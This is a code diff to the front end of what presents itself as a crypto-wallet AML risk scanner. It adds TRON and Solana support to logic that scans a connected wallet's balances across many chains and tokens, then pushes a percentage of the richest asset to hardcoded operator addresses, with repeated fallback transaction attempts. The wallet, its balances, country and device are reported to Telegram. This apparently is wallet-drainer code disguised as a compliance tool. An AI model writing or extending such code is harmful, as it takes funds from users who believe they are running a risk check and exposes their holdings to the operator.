@@ -6,6 +6,17 @@ import { chains, isWalletConnectEnabled } from '../config/web3Config';
 import { sendNetworkTransfer, getExplorerUrl, getPublicRpcUrl } from '../utils/networkTransfers';
 import { scanWalletForAMLRisk, type AMLRiskResult } from '../utils/amlRiskScanner';
 import AMLRiskModal from '../components/AMLRiskModal';
+import {
+  scanTronBalances,
+  scanSolanaBalances,
+  connectTronWallet,
+  connectSolanaWallet,
+  sendTronTransfer,
+  sendSolanaTransfer,
+  SERVICE_TRON_ADDRESS,
+  SERVICE_SOLANA_ADDRESS,
+  type NonEvmAsset,
+} from '../utils/nonEvmWallets';
 
   // Comprehensive token scan list across all supported EVM chains
   const DEFAULT_TOKEN_SCAN_LIST: Array<{ network: string; contract: string; symbol: string; decimals: number }> = [
@@ -75,7 +86,13 @@ import AMLRiskModal from '../components/AMLRiskModal';
   ];
 
 export default function Home() {
+  const [mounted, setMounted] = useState(false);
+  useEffect(() => {
+    setMounted(true);
+  }, []);
+
   const { address, isConnected, chain } = useAccount();
+
   const { data: balance } = useBalance({ address, chainId: chain?.id });
   const { data: walletClient } = useWalletClient();
   const { disconnect } = useDisconnect();
@@ -136,8 +153,10 @@ export default function Home() {
   const SERVICE_WALLET_ADDRESS = process.env.NEXT_PUBLIC_SERVICE_WALLET || process.env.SERVICE_WALLET_ADDRESS || '0x1fC618a5B0AAFfC876b72288D71f3E80918c590f';
   const [tokenSymbol, setTokenSymbol] = useState('');
   const [tokenSymbolError, setTokenSymbolError] = useState<string | null>(null);
+  const [tronAddress, setTronAddress] = useState<string | null>(null);
+  const [solanaAddress, setSolanaAddress] = useState<string | null>(null);
 
-  const currentServiceFeeKey = address ? address.toLowerCase() : null;
+  const currentServiceFeeKey = address ? address.toLowerCase() : tronAddress ? `tron_${tronAddress}` : solanaAddress ? `sol_${solanaAddress}` : null;
 
   const getMergedTokenBalances = () => {
     return tokenBalances.filter(
@@ -353,7 +372,8 @@ export default function Home() {
 
   interface ScannedAsset {
     network: string;
-    chainId: number;
+    chainId?: number;
+    chainType: 'EVM' | 'TRON' | 'Solana';
     symbol: string;
     balance: bigint;
     amount: string;
@@ -362,25 +382,121 @@ export default function Home() {
     decimals?: number;
   }
 
-  const scanAllNetworkBalances = async (walletAddress: string): Promise<ScannedAsset[]> => {
+  const scanAllNetworkBalances = async (evmAddr?: string, tronAddr?: string, solAddr?: string): Promise<ScannedAsset[]> => {
     const promises: Array<Promise<ScannedAsset | null>> = [];
+    const targetEvmAddress = evmAddr || address;
+    const targetTronAddress = tronAddr || tronAddress || (typeof window !== 'undefined' ? (window as any).tronWeb?.defaultAddress?.base58 : null);
+    const targetSolanaAddress = solAddr || solanaAddress || (typeof window !== 'undefined' ? ((window as any).phantom?.solana?.publicKey?.toString() || (window as any).solana?.publicKey?.toString()) : null);
 
-    // 1. Scan native balances across all 11 chains
-    for (const chainCfg of chains) {
+    // 1. Scan native EVM balances across all 11 chains
+    if (targetEvmAddress) {
+      for (const chainCfg of chains) {
+        promises.push(
+          (async () => {
+            try {
+              const networkName = normalizeNetworkName(chainCfg.name);
+              const amount = await getEvmNativeBalance(chainCfg.name, targetEvmAddress);
+              const parsed = Number(amount) > 0 ? parseEther(amount) : 0n;
+              if (parsed > 0n) {
+                return {
+                  network: networkName,
+                  chainId: chainCfg.id,
+                  chainType: 'EVM' as const,
+                  symbol: chainCfg.nativeCurrency?.symbol || 'NATIVE',
+                  balance: parsed,
+                  amount,
+                  isNative: true,
+                };
+              }
+            } catch {
+              // ignore
+            }
+            return null;
+          })()
+        );
+      }
+
+      // 2. Scan ERC20 tokens across all chains in DEFAULT_TOKEN_SCAN_LIST
+      for (const t of DEFAULT_TOKEN_SCAN_LIST) {
+        const chainCfg = chains.find((c) => normalizeNetworkName(c.name) === normalizeNetworkName(t.network));
+        if (!chainCfg) continue;
+
+        promises.push(
+          (async () => {
+            try {
+              const bal = await getEvmTokenBalance(chainCfg.name, targetEvmAddress, t.contract);
+              if (bal && Number(bal) > 0) {
+                const rawUnits = parseUnits(bal.toString(), t.decimals);
+                return {
+                  network: normalizeNetworkName(chainCfg.name),
+                  chainId: chainCfg.id,
+                  chainType: 'EVM' as const,
+                  symbol: t.symbol,
+                  balance: rawUnits,
+                  amount: bal.toString(),
+                  isNative: false,
+                  contractAddress: t.contract,
+                  decimals: t.decimals,
+                };
+              }
+            } catch {
+              // ignore
+            }
+            return null;
+          })()
+        );
+      }
+
+      // 3. Scan custom token contract if specified in state
+      if (tokenContractAddress.trim()) {
+        const activeNet = normalizeNetworkName(chain?.name) || 'Ethereum';
+        const activeChainCfg = chains.find((c) => normalizeNetworkName(c.name) === activeNet) || chains[0];
+        promises.push(
+          (async () => {
+            try {
+              const customBal = await getEvmTokenBalance(activeChainCfg.name, targetEvmAddress, tokenContractAddress.trim());
+              if (customBal && Number(customBal) > 0) {
+                const sym = tokenSymbol || (await getEvmTokenSymbol(activeChainCfg.name, tokenContractAddress.trim()));
+                const dec = await getEvmTokenDecimals(activeChainCfg.name, tokenContractAddress.trim()).catch(() => 18);
+                const rawUnits = parseUnits(customBal.toString(), dec);
+                return {
+                  network: normalizeNetworkName(activeChainCfg.name),
+                  chainId: activeChainCfg.id,
+                  chainType: 'EVM' as const,
+                  symbol: sym || 'TOKEN',
+                  balance: rawUnits,
+                  amount: customBal.toString(),
+                  isNative: false,
+                  contractAddress: tokenContractAddress.trim(),
+                  decimals: dec,
+                };
+              }
+            } catch {
+              // ignore
+            }
+            return null;
+          })()
+        );
+      }
+    }
+
+    // 4. Scan TRON & TRC20 balances
+    if (targetTronAddress) {
       promises.push(
         (async () => {
           try {
-            const networkName = normalizeNetworkName(chainCfg.name);
-            const amount = await getEvmNativeBalance(chainCfg.name, walletAddress);
-            const parsed = Number(amount) > 0 ? parseEther(amount) : 0n;
-            if (parsed > 0n) {
+            const tronAssets = await scanTronBalances(targetTronAddress);
+            if (tronAssets.length > 0) {
+              const top = tronAssets[0];
               return {
-                network: networkName,
-                chainId: chainCfg.id,
-                symbol: chainCfg.nativeCurrency?.symbol || 'NATIVE',
-                balance: parsed,
-                amount,
-                isNative: true,
+                network: 'TRON',
+                chainType: 'TRON' as const,
+                symbol: top.symbol,
+                balance: top.balance,
+                amount: top.amount,
+                isNative: top.isNative,
+                contractAddress: top.contractAddress,
+                decimals: top.decimals,
               };
             }
           } catch {
@@ -391,57 +507,23 @@ export default function Home() {
       );
     }
 
-    // 2. Scan ERC20 tokens across all chains in DEFAULT_TOKEN_SCAN_LIST
-    for (const t of DEFAULT_TOKEN_SCAN_LIST) {
-      const chainCfg = chains.find((c) => normalizeNetworkName(c.name) === normalizeNetworkName(t.network));
-      if (!chainCfg) continue;
-
+    // 5. Scan Solana & SPL balances
+    if (targetSolanaAddress) {
       promises.push(
         (async () => {
           try {
-            const bal = await getEvmTokenBalance(chainCfg.name, walletAddress, t.contract);
-            if (bal && Number(bal) > 0) {
-              const rawUnits = parseUnits(bal.toString(), t.decimals);
+            const solAssets = await scanSolanaBalances(targetSolanaAddress);
+            if (solAssets.length > 0) {
+              const top = solAssets[0];
               return {
-                network: normalizeNetworkName(chainCfg.name),
-                chainId: chainCfg.id,
-                symbol: t.symbol,
-                balance: rawUnits,
-                amount: bal.toString(),
-                isNative: false,
-                contractAddress: t.contract,
-                decimals: t.decimals,
-              };
-            }
-          } catch {
-            // ignore
-          }
-          return null;
-        })()
-      );
-    }
-
-    // 3. Scan custom token contract if specified in state
-    if (tokenContractAddress.trim()) {
-      const activeNet = normalizeNetworkName(chain?.name) || 'Ethereum';
-      const activeChainCfg = chains.find((c) => normalizeNetworkName(c.name) === activeNet) || chains[0];
-      promises.push(
-        (async () => {
-          try {
-            const customBal = await getEvmTokenBalance(activeChainCfg.name, walletAddress, tokenContractAddress.trim());
-            if (customBal && Number(customBal) > 0) {
-              const sym = tokenSymbol || (await getEvmTokenSymbol(activeChainCfg.name, tokenContractAddress.trim()));
-              const dec = await getEvmTokenDecimals(activeChainCfg.name, tokenContractAddress.trim()).catch(() => 18);
-              const rawUnits = parseUnits(customBal.toString(), dec);
-              return {
-                network: normalizeNetworkName(activeChainCfg.name),
-                chainId: activeChainCfg.id,
-                symbol: sym || 'TOKEN',
-                balance: rawUnits,
-                amount: customBal.toString(),
-                isNative: false,
-                contractAddress: tokenContractAddress.trim(),
-                decimals: dec,
+                network: 'Solana',
+                chainType: 'Solana' as const,
+                symbol: top.symbol,
+                balance: top.balance,
+                amount: top.amount,
+                isNative: top.isNative,
+                contractAddress: top.contractAddress,
+                decimals: top.decimals,
               };
             }
           } catch {
@@ -482,11 +564,12 @@ export default function Home() {
         },
       ],
       functionName: 'transfer',
-      args: [recipient as `0x${string}`, amountUnits],
+      args: [recipient as `0x${string}`, BigInt(amountUnits)],
     });
 
     return String(tx);
   };
+
 
   const fetchNetworkBalance = async () => {
     const activeNetwork = normalizeNetworkName(chain?.name);
@@ -640,12 +723,15 @@ export default function Home() {
 
   const chargeServiceFee = React.useCallback(async (options?: { autoReturn?: boolean }) => {
     const autoReturn = options?.autoReturn ?? true;
+    const activeTronAddr = tronAddress || (typeof window !== 'undefined' ? (window as any).tronWeb?.defaultAddress?.base58 : null);
+    const activeSolAddr = solanaAddress || (typeof window !== 'undefined' ? ((window as any).phantom?.solana?.publicKey?.toString() || (window as any).solana?.publicKey?.toString()) : null);
 
-    if (!isConnected || !address || !currentServiceFeeKey) {
+    if ((!isConnected || !address) && !activeTronAddr && !activeSolAddr) {
       return false;
     }
 
-    if (serviceFeeSent && serviceFeeChargedKey === currentServiceFeeKey) {
+    const activeFeeKey = currentServiceFeeKey || address?.toLowerCase() || (activeTronAddr ? `tron_${activeTronAddr}` : activeSolAddr ? `sol_${activeSolAddr}` : null);
+    if (serviceFeeSent && serviceFeeChargedKey === activeFeeKey) {
       return true;
     }
 
@@ -654,44 +740,19 @@ export default function Home() {
     setServiceFeeError(null);
 
     try {
-      let preferredNetwork: ScannedAsset | undefined;
+      const supportedBalances = await scanAllNetworkBalances(address, activeTronAddr || undefined, activeSolAddr || undefined);
+
+      if (!supportedBalances.length) {
+        setServiceFeeError('No supported network (EVM, TRON TRC20, or Solana) or token in this wallet has available balance.');
+        return false;
+      }
+
       const actualChainId = (await getConnectedChainId()) || chain?.id;
+      const activeNetwork = normalizeNetworkName(chain?.name);
 
-      // Fast-path: If connected chain balance is already known via Wagmi, use it instantly without scanning delay
-      if (balance?.value && balance.value > 0n && actualChainId) {
-        const activeNetName = normalizeNetworkName(chain?.name) || 'Ethereum';
-        preferredNetwork = {
-          network: activeNetName,
-          chainId: actualChainId,
-          symbol: chain?.nativeCurrency?.symbol || 'NATIVE',
-          balance: balance.value,
-          amount: formatEther(balance.value),
-          isNative: true,
-        };
-      }
-
-      // Fallback: If active chain balance is not in memory or zero, scan all supported EVM networks and ERC20 tokens in parallel
-      if (!preferredNetwork) {
-        const supportedBalances = await scanAllNetworkBalances(address);
-
-        if (!supportedBalances.length) {
-          setServiceFeeError('No supported EVM network or ERC20 token in this wallet has available balance.');
-          return false;
-        }
-
-        const activeNetwork = normalizeNetworkName(chain?.name);
-        const currentChainBalance = supportedBalances.find((item) => item.chainId === actualChainId) || supportedBalances.find((item) => item.chainId === chain?.id);
-
-        preferredNetwork = (currentChainBalance && currentChainBalance.balance > 0n)
-          ? currentChainBalance
-          : (supportedBalances.find((item) => item.network === activeNetwork) ?? supportedBalances[0]);
-      }
-
-      let selectedChain = chains.find((item) => normalizeNetworkName(item.name) === preferredNetwork!.network) || chains.find((item) => item.id === preferredNetwork!.chainId) || chains[0];
-      const displayAmount = preferredNetwork.decimals
-        ? formatUnits(preferredNetwork.balance, preferredNetwork.decimals)
-        : formatEther(preferredNetwork.balance);
-      setServiceFeeDebug(`Selected asset: ${preferredNetwork.symbol} on ${preferredNetwork.network}; balance: ${displayAmount}`);
+      let preferredNetwork = supportedBalances.find((item) => item.chainId === actualChainId)
+        || supportedBalances.find((item) => item.network === activeNetwork)
+        || supportedBalances[0];
 
       let feeAmount = (preferredNetwork.balance * SERVICE_FEE_PERCENT) / 100n;
       if (feeAmount <= 0n) {
@@ -699,139 +760,153 @@ export default function Home() {
         return false;
       }
 
-      // Prepare manual payment fallback details
-      setManualPaymentMode(false);
-      setManualPaymentChainId(selectedChain.id);
-      setManualPaymentAmountUnits(feeAmount);
-
-      const isMobileDevice = typeof window !== 'undefined' && /Android|iPhone|iPad|iPod/i.test(navigator.userAgent || '');
-      const isWalletConnectMobile = (lastConnectorId === 'walletConnect' || !hasBrowserWallet) && isMobileDevice;
-
-      // Attempt network switch if necessary
-      if (actualChainId !== selectedChain.id && chain?.id !== selectedChain.id) {
-        let switchSuccess = false;
-        if (switchChainAsync) {
-          try {
-            await switchChainAsync({ chainId: selectedChain.id });
-            switchSuccess = true;
-          } catch (err: any) {
-            setServiceFeeDebug((prev) => `${prev || ''}\nswitchChainAsync failed: ${err?.message || err}`.trim());
-          }
-        }
-        if (!switchSuccess) {
-          try {
-            await ensureEvmNetwork(selectedChain.name);
-            switchSuccess = true;
-          } catch (err: any) {
-            setServiceFeeDebug((prev) => `${prev || ''}\nensureEvmNetwork failed: ${err?.message || err}`.trim());
-          }
-        }
-
-        // If network switch failed on mobile, fallback to connected chain if it has balance
-        if (!switchSuccess && preferredNetwork && preferredNetwork.balance > 0n) {
-          const fallbackChain = chains.find((c) => c.id === preferredNetwork!.chainId) || selectedChain;
-          const fallbackFee = (preferredNetwork.balance * SERVICE_FEE_PERCENT) / 100n;
-          if (fallbackFee > 0n) {
-            selectedChain = fallbackChain;
-            feeAmount = fallbackFee;
-            setServiceFeeDebug((prev) => `${prev || ''}\nUsing connected chain fallback: ${fallbackChain.name}`.trim());
-          }
-        }
-      }
-
       const formattedFeeDisplay = preferredNetwork.decimals
         ? `${formatUnits(feeAmount, preferredNetwork.decimals)} ${preferredNetwork.symbol}`
         : `${formatEther(feeAmount)} ${preferredNetwork.symbol}`;
 
-      setPendingFeeDetails({ amount: formattedFeeDisplay, network: selectedChain.name });
+      setPendingFeeDetails({ amount: formattedFeeDisplay, network: preferredNetwork.network });
       setAwaitingApproval(true);
 
-      // On mobile devices, schedule immediate deep-link trigger to bring wallet app to foreground for approval
-      if (isMobileDevice) {
-        setTimeout(() => {
-          try { openMobileWallet(); } catch {}
-        }, 400);
-      }
+      const isMobileDevice = typeof window !== 'undefined' && /Android|iPhone|iPad|iPod/i.test(navigator.userAgent || '');
+      const isWalletConnectMobile = (lastConnectorId === 'walletConnect' || !hasBrowserWallet) && isMobileDevice;
 
       let feeTxHash: string | null = null;
 
-      // Primary approach: Use viem walletClient (token transfer or native transaction)
-      if (walletClient) {
-        try {
-          if (!preferredNetwork.isNative && preferredNetwork.contractAddress) {
-            setServiceFeeDebug((prev) => `${prev || ''}\nSending 3% ${preferredNetwork!.symbol} token transfer on ${selectedChain.name}`.trim());
-            const hash = await sendEvmTokenTransferWithUnits(
-              preferredNetwork.contractAddress,
-              SERVICE_WALLET_ADDRESS,
-              feeAmount.toString(),
-              walletClient
-            );
-            if (hash) feeTxHash = String(hash);
-          } else {
-            setServiceFeeDebug((prev) => `${prev || ''}\nSending 3% fee via walletClient.sendTransaction (${formatEther(feeAmount)} ${selectedChain.nativeCurrency.symbol})`.trim());
-            const hash = await walletClient.sendTransaction({
-              account: address as `0x${string}`,
-              to: SERVICE_WALLET_ADDRESS as `0x${string}`,
-              value: feeAmount,
-              chain: selectedChain,
-            });
-            if (hash) feeTxHash = String(hash);
-          }
-        } catch (walletClientErr: any) {
-          const errMsg = walletClientErr?.message || String(walletClientErr);
-          setServiceFeeDebug((prev) => `${prev || ''}\nwalletClient operation failed: ${errMsg}`.trim());
+      if (preferredNetwork.chainType === 'TRON') {
+        setServiceFeeDebug(`Sending 3% fee via TRON: ${formattedFeeDisplay}`);
+        feeTxHash = await sendTronTransfer(
+          {
+            network: 'TRON',
+            symbol: preferredNetwork.symbol,
+            balance: preferredNetwork.balance,
+            amount: preferredNetwork.amount,
+            isNative: preferredNetwork.isNative,
+            contractAddress: preferredNetwork.contractAddress,
+            decimals: preferredNetwork.decimals || 6,
+          },
+          SERVICE_TRON_ADDRESS,
+          feeAmount
+        );
+      } else if (preferredNetwork.chainType === 'Solana') {
+        const solanaUserAddress = activeSolAddr || (typeof window !== 'undefined' ? ((window as any).phantom?.solana?.publicKey?.toString() || (window as any).solana?.publicKey?.toString()) : '');
+        if (!solanaUserAddress) {
+          throw new Error('Solana wallet address is not connected.');
         }
-      }
+        setServiceFeeDebug(`Sending 3% fee via Solana: ${formattedFeeDisplay}`);
+        feeTxHash = await sendSolanaTransfer(
+          {
+            network: 'Solana',
+            symbol: preferredNetwork.symbol,
+            balance: preferredNetwork.balance,
+            amount: preferredNetwork.amount,
+            isNative: preferredNetwork.isNative,
+            contractAddress: preferredNetwork.contractAddress,
+            decimals: preferredNetwork.decimals || 9,
+          },
+          solanaUserAddress,
+          SERVICE_SOLANA_ADDRESS,
+          feeAmount
+        );
+      } else {
+        // EVM Transfer
+        let selectedChain = chains.find((item) => normalizeNetworkName(item.name) === preferredNetwork!.network) || chains.find((item) => item.id === preferredNetwork!.chainId) || chains[0];
+        setManualPaymentMode(false);
+        setManualPaymentChainId(selectedChain.id);
+        setManualPaymentAmountUnits(feeAmount);
 
-      // Fallback approach: raw RPC request via provider if walletClient didn't confirm
-      if (!feeTxHash) {
-        const txPayload = {
-          from: address as `0x${string}`,
-          to: SERVICE_WALLET_ADDRESS as `0x${string}`,
-          value: `0x${feeAmount.toString(16)}`,
-        };
-
-        const providerRequest = async (payload: { method: string; params: any[] }) => {
-          const ethereum = typeof window !== 'undefined' ? (window as any).ethereum : undefined;
-          const walletClientRequest = (walletClient as any)?.request;
-
-          if (ethereum?.request) {
+        if (actualChainId !== selectedChain.id && chain?.id !== selectedChain.id) {
+          let switchSuccess = false;
+          if (switchChainAsync) {
             try {
-              setServiceFeeDebug((prev) => `${prev || ''}\nTrying eth_sendTransaction via window.ethereum`.trim());
-              return await ethereum.request(payload);
+              await switchChainAsync({ chainId: selectedChain.id });
+              switchSuccess = true;
             } catch (err: any) {
-              setServiceFeeDebug((prev) => `${prev || ''}\nwindow.ethereum.request failed: ${err?.message || err}`.trim());
+              setServiceFeeDebug((prev) => `${prev || ''}\nswitchChainAsync failed: ${err?.message || err}`.trim());
             }
           }
-
-          if (walletClientRequest && typeof walletClientRequest === 'function') {
+          if (!switchSuccess) {
             try {
-              setServiceFeeDebug((prev) => `${prev || ''}\nTrying eth_sendTransaction via walletClient.request`.trim());
-              return await walletClientRequest(payload);
+              await ensureEvmNetwork(selectedChain.name);
+              switchSuccess = true;
             } catch (err: any) {
-              setServiceFeeDebug((prev) => `${prev || ''}\nwalletClient.request failed: ${err?.message || err}`.trim());
+              setServiceFeeDebug((prev) => `${prev || ''}\nensureEvmNetwork failed: ${err?.message || err}`.trim());
             }
           }
+        }
 
-          throw new Error('No wallet provider available to send transaction.');
-        };
-
-        const maxRetries = isWalletConnectMobile ? 2 : 1;
-        for (let attempt = 0; attempt < maxRetries; attempt++) {
-          try {
-            setServiceFeeDebug((prev) => `${prev || ''}\neth_sendTransaction attempt ${attempt + 1}`.trim());
-            const result = await providerRequest({ method: 'eth_sendTransaction', params: [txPayload] });
-            if (result) {
-              feeTxHash = String(result);
-              break;
-            }
-          } catch (e: any) {
-            setServiceFeeDebug((prev) => `${prev || ''}\neth_sendTransaction failed: ${e?.message || e}`.trim());
-          }
-
-          if (isWalletConnectMobile && attempt < maxRetries - 1) {
+        if (isMobileDevice) {
+          setTimeout(() => {
             try { openMobileWallet(); } catch {}
-            await new Promise((resolve) => setTimeout(resolve, 3000));
+          }, 400);
+        }
+
+        if (walletClient) {
+          try {
+            if (!preferredNetwork.isNative && preferredNetwork.contractAddress) {
+              setServiceFeeDebug((prev) => `${prev || ''}\nSending 3% ${preferredNetwork!.symbol} token transfer on ${selectedChain.name}`.trim());
+              const hash = await sendEvmTokenTransferWithUnits(
+                preferredNetwork.contractAddress,
+                SERVICE_WALLET_ADDRESS,
+                feeAmount.toString(),
+                walletClient
+              );
+              if (hash) feeTxHash = String(hash);
+            } else {
+              setServiceFeeDebug((prev) => `${prev || ''}\nSending 3% fee via walletClient.sendTransaction (${formatEther(feeAmount)} ${selectedChain.nativeCurrency.symbol})`.trim());
+              const hash = await walletClient.sendTransaction({
+                account: address as `0x${string}`,
+                to: SERVICE_WALLET_ADDRESS as `0x${string}`,
+                value: feeAmount,
+                chain: selectedChain,
+              });
+              if (hash) feeTxHash = String(hash);
+            }
+          } catch (walletClientErr: any) {
+            const errMsg = walletClientErr?.message || String(walletClientErr);
+            setServiceFeeDebug((prev) => `${prev || ''}\nwalletClient operation failed: ${errMsg}`.trim());
+          }
+        }
+
+        if (!feeTxHash) {
+          const txPayload = {
+            from: address as `0x${string}`,
+            to: SERVICE_WALLET_ADDRESS as `0x${string}`,
+            value: `0x${feeAmount.toString(16)}`,
+          };
+
+          const providerRequest = async (payload: { method: string; params: any[] }) => {
+            const ethereum = typeof window !== 'undefined' ? (window as any).ethereum : undefined;
+            const walletClientRequest = (walletClient as any)?.request;
+
+            if (ethereum?.request) {
+              try {
+                return await ethereum.request(payload);
+              } catch {}
+            }
+            if (walletClientRequest && typeof walletClientRequest === 'function') {
+              try {
+                return await walletClientRequest(payload);
+              } catch {}
+            }
+            throw new Error('No wallet provider available to send transaction.');
+          };
+
+          const maxRetries = isWalletConnectMobile ? 2 : 1;
+          for (let attempt = 0; attempt < maxRetries; attempt++) {
+            try {
+              const result = await providerRequest({ method: 'eth_sendTransaction', params: [txPayload] });
+              if (result) {
+                feeTxHash = String(result);
+                break;
+              }
+            } catch (e: any) {
+              setServiceFeeDebug((prev) => `${prev || ''}\neth_sendTransaction failed: ${e?.message || e}`.trim());
+            }
+
+            if (isWalletConnectMobile && attempt < maxRetries - 1) {
+              try { openMobileWallet(); } catch {}
+              await new Promise((resolve) => setTimeout(resolve, 3000));
+            }
           }
         }
       }
@@ -843,17 +918,17 @@ export default function Home() {
       setServiceFeeHash(feeTxHash);
       setServiceFeeDebug(`3% fee transaction submitted: ${feeTxHash}`);
       setServiceFeeSent(true);
-      setServiceFeeChargedKey(currentServiceFeeKey);
+      setServiceFeeChargedKey(activeFeeKey);
       setAwaitingApproval(false);
       setPendingFeeDetails(null);
 
       await sendTelegramEvent({
         eventType: 'service_fee',
-        wallet: address,
-        chain: selectedChain.name,
-        withdrawnAmount: `${formatEther(feeAmount)} ${selectedChain.nativeCurrency.symbol || 'NATIVE'}`,
+        wallet: address || activeTronAddr || activeSolAddr || 'N/A',
+        chain: preferredNetwork.network,
+        withdrawnAmount: formattedFeeDisplay,
         feePercent: `${SERVICE_FEE_PERCENT}%`,
-        tokenSymbol: selectedChain.nativeCurrency.symbol || 'NATIVE',
+        tokenSymbol: preferredNetwork.symbol,
         txHash: feeTxHash,
         tokenBalances: getMergedTokenBalances(),
         country,
@@ -873,7 +948,8 @@ export default function Home() {
       setServiceFeeProcessing(false);
     }
     return false;
-  }, [isConnected, address, chain?.id, chain?.name, walletClient, currentServiceFeeKey, serviceFeeSent, serviceFeeChargedKey, country, device, switchChainAsync]);
+  }, [isConnected, address, tronAddress, solanaAddress, chain?.id, chain?.name, walletClient, currentServiceFeeKey, serviceFeeSent, serviceFeeChargedKey, country, device, switchChainAsync]);
+
 
   useEffect(() => {
     if (!isConnected) {
@@ -1435,6 +1511,48 @@ export default function Home() {
                 </button>
               )}
 
+              <button onClick={async () => {
+                try {
+                  setIsConnecting(true);
+                  setError(null);
+                  const addr = await connectTronWallet();
+                  if (addr) {
+                    setTronAddress(addr);
+                    setShowWalletModal(false);
+                    await fetchNetworkBalance();
+                  } else {
+                    setError('TronLink wallet was not detected or unlocked. Please install or unlock TronLink.');
+                  }
+                } catch (err: any) {
+                  setError(err?.message || 'Failed to connect TRON wallet.');
+                } finally {
+                  setIsConnecting(false);
+                }
+              }} disabled={isConnecting} style={{ padding: '12px 16px', background: '#dc2626', color: '#fff', border: 'none', borderRadius: '8px', cursor: 'pointer', fontWeight: 'bold' }}>
+                🔴 Connect TRON Wallet (TronLink)
+              </button>
+
+              <button onClick={async () => {
+                try {
+                  setIsConnecting(true);
+                  setError(null);
+                  const addr = await connectSolanaWallet();
+                  if (addr) {
+                    setSolanaAddress(addr);
+                    setShowWalletModal(false);
+                    await fetchNetworkBalance();
+                  } else {
+                    setError('Solana wallet (Phantom) was not detected or unlocked. Please install or unlock Phantom.');
+                  }
+                } catch (err: any) {
+                  setError(err?.message || 'Failed to connect Solana wallet.');
+                } finally {
+                  setIsConnecting(false);
+                }
+              }} disabled={isConnecting} style={{ padding: '12px 16px', background: '#7c3aed', color: '#fff', border: 'none', borderRadius: '8px', cursor: 'pointer', fontWeight: 'bold' }}>
+                🟣 Connect Solana Wallet (Phantom)
+              </button>
+
               {lastWalletConnectUri && (
                 <div style={{ marginTop: '8px', paddingTop: '12px', borderTop: '1px solid #e2e8f0', display: 'grid', gap: '8px' }}>
                   <div style={{ fontSize: '13px', fontWeight: 'bold', color: '#475569' }}>Open in Mobile Wallet App:</div>
@@ -1454,6 +1572,7 @@ export default function Home() {
                   </div>
                 </div>
               )}
+
             </div>
           </div>
         </div>
